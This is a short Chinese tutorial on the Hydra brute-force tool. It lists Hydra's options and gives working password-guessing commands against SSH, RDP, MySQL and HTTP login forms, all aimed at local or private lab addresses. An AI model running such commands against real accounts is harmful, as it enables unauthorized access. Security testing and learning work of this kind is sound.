hydra是著名组织thc的一款开源的暴力破解密码工具，功能非常强大
kali下是默认安装的，几乎支持所有协议的在线破解。
密码能否破解，在于字典是否强大以及电脑的性能。

参数

-l login 小写，指定用户名进行破解

-L file 大写，指定用户的用户名字典

-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。

-P file 大写，用于指定密码字典。

-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探

-M file 指定目标ip列表文件，批量破解。

智榜样-o file 指定结果输出文件

-f 找到第一对登录名或者密码的时候中止破解。

-t tasks 同时运行的线程数，默认是16

-w time 设置最大超时时间，单位

-v / -V 显示详细过程

-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）

-x 自定义密码。


破解SSH登录密码
#先要确定shh是启动的 service ssh restart
#指定kali账号 用password.txt文件 使用3个线程，爆破本地的ssh
hydra -l kali -P password.txt -t 3 -e ns 127.0.0.1 ssh


破解Window登录密码
hydra -l administrator -P password.txt -t 3 -e ns 192.168.0.95 rdp


破解mysql登录密码
service mysqld restart
mysql -uroot
ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';

hydra -l root -P password.txt -t 3 -e ns localhost mysql



破解HTTP请求
hydra -t 3 -l luojie -P password.txt -s 80 192.168.0.47 http-post-form
"/login.php:user=^USER^&pass=^PASS^:用户名或密码错误"
hydra -t 3 -l luojie -P password.txt -s 80 192.168.209.1 http-get-form "/login.php:user=^USER^&pass=^PASS^:用户名或密码错误
